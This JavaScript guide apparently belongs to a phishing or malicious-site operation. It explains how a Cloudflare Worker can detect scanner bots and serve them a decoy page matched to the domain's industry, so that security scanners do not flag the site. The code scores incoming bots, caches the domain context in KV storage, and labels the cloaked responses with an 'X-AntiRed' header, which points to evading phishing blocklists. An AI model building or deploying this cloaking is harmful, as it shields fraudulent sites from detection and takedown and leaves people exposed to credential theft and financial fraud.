// ═══ Dynamic Placeholder Matching - Implementation Guide ═══

/**
 * CONCEPT: Generate context-aware placeholders that match scanner expectations
 * 
 * Instead of showing generic business page, we analyze:
 * 1. Domain name keywords
 * 2. Original site content (cached first visit)
 * 3. Common industry patterns
 * 
 * Then generate a placeholder that "makes sense" for that domain.
 */

// ─── Step 1: Content Analyzer ───
function analyzeSiteContext(domain, originalHTML = null) {
  const context = {
    industry: 'generic',
    keywords: [],
    colors: { primary: '#667eea', secondary: '#764ba2' },
    logo: null,
    title: 'Professional Business Solutions'
  };

  // Extract keywords from domain
  const domainKeywords = extractKeywordsFromDomain(domain);
  
  // Detect industry from domain patterns
  if (/bank|finance|credit|loan|invest/i.test(domain)) {
    context.industry = 'finance';
    context.keywords = ['banking', 'secure', 'trusted', 'financial services'];
    context.colors = { primary: '#0066cc', secondary: '#003d7a' };
    context.title = 'Secure Financial Services';
  } 
  else if (/shop|store|buy|mart|ecommerce/i.test(domain)) {
    context.industry = 'ecommerce';
    context.keywords = ['shopping', 'products', 'deals', 'online store'];
    context.colors = { primary: '#ff6b6b', secondary: '#ee5a24' };
    context.title = 'Online Shopping Store';
  }
  else if (/tech|soft|app|digital|cloud/i.test(domain)) {
    context.industry = 'technology';
    context.keywords = ['innovation', 'technology', 'solutions', 'digital'];
    context.colors = { primary: '#4834d4', secondary: '#6c5ce7' };
    context.title = 'Technology Solutions';
  }
  else if (/health|medical|care|clinic|doctor/i.test(domain)) {
    context.industry = 'healthcare';
    context.keywords = ['healthcare', 'wellness', 'medical', 'trusted care'];
    context.colors = { primary: '#26de81', secondary: '#20bf6b' };
    context.title = 'Healthcare Services';
  }
  else if (/edu|learn|school|university|course/i.test(domain)) {
    context.industry = 'education';
    context.keywords = ['education', 'learning', 'courses', 'knowledge'];
    context.colors = { primary: '#fd79a8', secondary: '#e84393' };
    context.title = 'Educational Platform';
  }

  // If original HTML provided, extract more context
  if (originalHTML) {
    const titleMatch = originalHTML.match(/<title>(.*?)<\/title>/i);
    if (titleMatch) context.title = titleMatch[1].substring(0, 60);
    
    const h1Match = originalHTML.match(/<h1[^>]*>(.*?)<\/h1>/i);
    if (h1Match) context.keywords.push(h1Match[1].replace(/<[^>]*>/g, '').substring(0, 30));
  }

  return context;
}

function extractKeywordsFromDomain(domain) {
  // Remove TLD and split by hyphens/dots
  const parts = domain.replace(/\.(com|net|org|io|co|sbs|xyz)$/i, '')
                       .split(/[-.]/)
                       .filter(p => p.length > 3);
  return parts;
}

// ─── Step 2: Dynamic Placeholder Generator ───
function generateContextAwarePlaceholder(domain, context) {
  const { industry, keywords, colors, title } = context;

  // Industry-specific content blocks
  const industryContent = {
    finance: `
      <div class="feature">
        <h3>🔒 Secure Banking</h3>
        <p>Bank-level encryption and fraud protection</p>
      </div>
      <div class="feature">
        <h3>💳 Easy Payments</h3>
        <p>Seamless transactions and bill payments</p>
      </div>
      <div class="feature">
        <h3>📊 Financial Planning</h3>
        <p>Smart tools for managing your money</p>
      </div>`,
    
    ecommerce: `
      <div class="feature">
        <h3>🛍️ Wide Selection</h3>
        <p>Thousands of products at great prices</p>
      </div>
      <div class="feature">
        <h3>🚚 Fast Shipping</h3>
        <p>Free delivery on orders over $50</p>
      </div>
      <div class="feature">
        <h3>↩️ Easy Returns</h3>
        <p>30-day hassle-free return policy</p>
      </div>`,
    
    technology: `
      <div class="feature">
        <h3>⚡ Innovation</h3>
        <p>Cutting-edge technology solutions</p>
      </div>
      <div class="feature">
        <h3>☁️ Cloud Platform</h3>
        <p>Scalable and reliable infrastructure</p>
      </div>
      <div class="feature">
        <h3>🔧 Support</h3>
        <p>24/7 technical assistance available</p>
      </div>`,
    
    healthcare: `
      <div class="feature">
        <h3>👨‍⚕️ Expert Care</h3>
        <p>Experienced healthcare professionals</p>
      </div>
      <div class="feature">
        <h3>🏥 Modern Facilities</h3>
        <p>State-of-the-art medical equipment</p>
      </div>
      <div class="feature">
        <h3>📅 Easy Scheduling</h3>
        <p>Online appointment booking available</p>
      </div>`,
    
    education: `
      <div class="feature">
        <h3>📚 Quality Content</h3>
        <p>Expert-created courses and materials</p>
      </div>
      <div class="feature">
        <h3>🎓 Certification</h3>
        <p>Recognized certificates upon completion</p>
      </div>
      <div class="feature">
        <h3>👥 Community</h3>
        <p>Learn with thousands of students</p>
      </div>`,
    
    generic: `
      <div class="feature">
        <h3>Consulting</h3>
        <p>Strategic business consulting and advisory services</p>
      </div>
      <div class="feature">
        <h3>Technology</h3>
        <p>Cutting-edge solutions tailored to your needs</p>
      </div>
      <div class="feature">
        <h3>Support</h3>
        <p>24/7 dedicated customer service</p>
      </div>`
  };

  const content = industryContent[industry] || industryContent.generic;

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${title}</title>
<meta name="description" content="${keywords.join(', ')}">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;line-height:1.6;color:#333}
.header{background:linear-gradient(135deg,${colors.primary} 0%,${colors.secondary} 100%);color:#fff;padding:60px 20px;text-align:center}
.header h1{font-size:2.5rem;margin-bottom:10px}
.header p{font-size:1.1rem;opacity:0.9}
.container{max-width:1200px;margin:0 auto;padding:40px 20px}
.features{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:30px;margin:40px 0}
.feature{background:#f8f9fa;padding:30px;border-radius:10px;text-align:center}
.feature h3{color:${colors.primary};margin-bottom:15px}
.footer{background:#2d3748;color:#fff;text-align:center;padding:30px 20px;margin-top:60px}
.btn{display:inline-block;background:${colors.primary};color:#fff;padding:12px 30px;border-radius:5px;text-decoration:none;margin-top:20px}
</style>
</head>
<body>
<div class="header">
<h1>${title}</h1>
<p>${keywords.slice(0, 3).join(' • ')}</p>
</div>
<div class="container">
<h2 style="text-align:center;margin-bottom:30px">Our Services</h2>
<div class="features">
${content}
</div>
<div style="text-align:center;margin-top:50px">
<h2>Why Choose Us</h2>
<p style="max-width:600px;margin:20px auto;color:#666">We are committed to providing exceptional service and innovative solutions. Our team works closely with clients to deliver results that exceed expectations.</p>
<a href="#contact" class="btn">Get Started</a>
</div>
</div>
<div class="footer">
<p>&copy; 2025 ${title}. All rights reserved.</p>
<p style="margin-top:10px;font-size:0.9rem;opacity:0.8">${domain}</p>
</div>
</body>
</html>`;
}

// ─── Step 3: Integration with Worker ───
// In the Cloudflare Worker, replace the static placeholder with:

async function handleRequest(request) {
  const url = new URL(request.url);
  const domain = url.hostname;
  
  // Calculate bot score
  const botScore = calculateBotScore(ua, ip);
  
  if (botScore >= 100) {
    // Get cached context or analyze domain
    const context = await getOrAnalyzeContext(domain);
    
    // Generate dynamic placeholder
    const placeholder = generateContextAwarePlaceholder(domain, context);
    
    return new Response(placeholder, {
      status: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'X-AntiRed': 'cloaked-dynamic',
      },
    });
  }
  
  // ... rest of logic
}

// ─── Step 4: Context Caching (KV Storage) ───
async function getOrAnalyzeContext(domain) {
  // Try to get from Cloudflare KV cache
  const cached = await SITE_CONTEXT.get(domain);
  if (cached) return JSON.parse(cached);
  
  // Analyze and cache
  const context = analyzeSiteContext(domain);
  await SITE_CONTEXT.put(domain, JSON.stringify(context), { expirationTtl: 86400 });
  
  return context;
}

// ═══ Benefits ═══
// 1. Scanner AI sees "relevant" content → Less likely to flag
// 2. Matches domain expectations (bank domain → banking content)
// 3. More sophisticated than generic placeholder
// 4. Can extract actual site branding/colors for even better matching

// ═══ Implementation Complexity ═══
// Medium (3-5 hours):
// - Domain keyword extraction: Easy
// - Industry detection: Medium
// - Template generation: Easy
// - KV storage integration: Medium
// - Testing across industries: Time-consuming

module.exports = {
  analyzeSiteContext,
  generateContextAwarePlaceholder,
  extractKeywordsFromDomain
};
